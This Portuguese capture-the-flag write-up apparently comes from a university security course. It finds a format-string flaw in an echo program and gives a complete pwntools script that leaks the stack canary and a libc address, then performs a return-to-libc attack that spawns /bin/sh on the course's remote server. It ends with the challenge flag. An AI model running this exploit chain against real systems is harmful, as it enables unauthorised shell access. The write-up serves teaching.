# CTF Echo 800
Decidimos executar o programa fornecido efoi nos exibido um prompt solicitando uma opção, como podemos verificar:
```shell
[06/04/23]seed@VM:~/Downloads$ ./program
Insert an option:
- "e" to echo your input.
- "q" to quit the program.
>
```
No entanto, ao investigar mais a fundo o programa, fizemos um debug om o `gdb`, descobrimos que a função fgets esta a ler 100 caracteres, o que era estranho, pois o limite máximo deveria ser de apenas 20 caracteres.

Com base nessa descoberta, começamos a suspeitar de uma vulnerabilidade de formatação de string. Para confirmar nossas suspeitas, decidimos testar inserindo uma sequência de formatação %x como o nome:

```
^Z
[1]+  Stopped                 ./program
[06/04/23]seed@VM:~/Downloads$ 
[06/04/23]seed@VM:~/Downloads$ ./program
Insert an option:
- "e" to echo your input.
- "q" to quit the program.
>e       
Insert your name (max 20 chars): %x%x%x%x%x
65e7458417825782578257825a7825
Insert your message: 

```
Como conseguimos imprimir informações da stack, fomos então pesquisar ataques desta vulnerabilidade de formatação de string.
Durante nossa pesquisa, encontramos informações sobre um ataque chamado "Return-to-libc". Esse ataque se aproveita de uma vulnerabilidade de stack overflow para modificar o fluxo de execução do programa e executar código arbitrário. Decidimos implementar um script para realizar esse ataque.

```python
#!/usr/bin/python3
from pwn import *

LOCAL = False

# Definindo os deslocamentos necessários
referenceLibOffset = 0xf7daa519 - 0xf7d89000
systemLibOffset = 0x48150
shLibOffset = 0x1bd0f5

# Função para enviar mensagens
def sendMessage(p, message):
    p.recvuntil(b">")  # Aguarda até receber o caractere '>'
    p.sendline(b"e")  # Envia a letra 'e'
    p.recvuntil(b"Insert your name (max 20 chars): ")  # Aguarda até receber a mensagem de inserção do nome
    p.sendline(message)  # Envia a mensagem fornecida como argumento
    answer = p.recvline()  # Recebe a resposta
    p.recvuntil(b"Insert your message: ")  # Aguarda até receber a mensagem de inserção da mensagem
    p.sendline(b"")  # Envia uma linha vazia como mensagem
    return answer  # Retorna a resposta recebida

if LOCAL:
    pause()  # Pausa a execução do programa, se estiver em ambiente local
else:
    p = remote("ctf-sp.dcc.fc.up.pt", 4002)  # Conecta-se ao servidor remoto

# Envia a primeira mensagem para obter informações importantes
firstMessage = sendMessage(p, b"%8$x-%11$x")

# Obtém o valor do canário e da referência convertendo-os para inteiros a partir da primeira mensagem recebida
canary, referenceVal = [int(val, 16) for val in firstMessage.split(b'-')]

# Calcula a base da biblioteca usando o deslocamento da referência
libBase = referenceVal - referenceLibOffset

# Calcula o endereço da função system e da string "/bin/sh" usando os respectivos deslocamentos
addressSystem = libBase + systemLibOffset
addressSH = libBase + shLibOffset

# Cria a segunda mensagem usando os valores obtidos
secondMessage = flat(b"A"*20, canary + 1, b"A"*8, addressSystem, b"A"*4, addressSH)

# Envia a segunda mensagem
sendMessage(p, secondMessage)

# Envia uma terceira mensagem com caracteres 'A' repetidos 19 vezes
sendMessage(p, b"A"*19)

p.interactive()  # Permite interação com o programa após o envio das mensagens
```

- No script, estabelecemos uma conexão com o servidor remoto e enviamos a primeira mensagem para obter informações importantes. Analisamos a resposta e extraímos o valor do canário e da referência, convertendo-os em inteiros.

- Usando esses valores, calculamos a base da biblioteca dinâmica, que é necessária para determinar os endereços das funções desejadas. Com base nos deslocamentos fornecidos, calculamos os endereços da função `system` e da string `/bin/sh`.

- Em seguida, criamos a segunda mensagem, que é projetada para explorar a vulnerabilidade de estouro de pilha e redirecionar a execução do programa para a função `system`, passando o endereço da string `/bin/sh` como argumento.

- Por fim, enviamos a segunda mensagem para executar o ataque Return-to-libc e, em seguida, enviamos uma terceira mensagem com caracteres 'A' repetidos 19 vezes, apenas para manter a interação com o programa remoto.

Executamos o programa, e como já tinhamos acesso á shell fizemos só um `ls` o que tinha lá a flag.

![image](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/102924343/b7423fe5-49d8-4c31-a966-2dbb57cda2e6)

```
flag{11ae7bc9ff1999e48a4dbc98ea49a4ab}
```
